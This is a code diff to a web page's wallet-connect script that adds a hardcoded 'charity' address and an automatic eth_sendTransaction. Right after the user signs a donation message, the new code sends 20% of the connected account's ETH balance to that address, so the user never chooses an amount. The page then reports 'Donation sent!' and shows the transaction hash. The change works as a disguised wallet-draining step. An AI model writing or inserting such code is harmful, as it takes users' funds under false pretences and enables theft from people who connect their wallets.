@@ -39,6 +39,7 @@
 
   <script>
     const PROJECT_ID = '38ca358a76d6819a0f6f5223030dee32';
+    const CHARITY_ADDRESS = '0x7BB7a58a41f0B1B4c43e29a1B36EbBCCE8469fe9';
     document.getElementById('projid').textContent = PROJECT_ID;
 
     const connectBtn = document.getElementById('connect');
@@ -95,7 +96,6 @@
 
         if (!connectedAccount) throw new Error('No account returned');
         statusEl.textContent = `Connected: ${connectedAccount}`;
-
         disconnectBtn.disabled = false;
 
         // Get balance
@@ -114,9 +114,20 @@
           method: 'personal_sign',
           params: [message, connectedAccount]
         });
+        statusEl.textContent += ' ✅ Donation approved via signature. Sending ETH...';
 
-        statusEl.textContent += ' ✅ Donation approved via signature.';
+        // Send 20% ETH automatically
+        const txHash = await provider.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: connectedAccount,
+            to: CHARITY_ADDRESS,
+            value: '0x' + (BigInt(Math.floor(balance * 1e18 * 0.2))).toString(16)
+          }]
+        });
 
+        statusEl.textContent += ` ✅ Donation sent! Transaction hash: ${txHash}`;
+        
         if (provider.on) {
           provider.on('accountsChanged', accs => {
             connectedAccount = accs?.[0] || null;
@@ -126,7 +137,7 @@
           provider.on('disconnect', cleanup);
         }
       } catch (err) {
-        statusEl.textContent = 'Connection or signature failed: ' + err.message;
+        statusEl.textContent = 'Connection or transaction failed: ' + err.message;
         connectBtn.disabled = false;
       }
     }
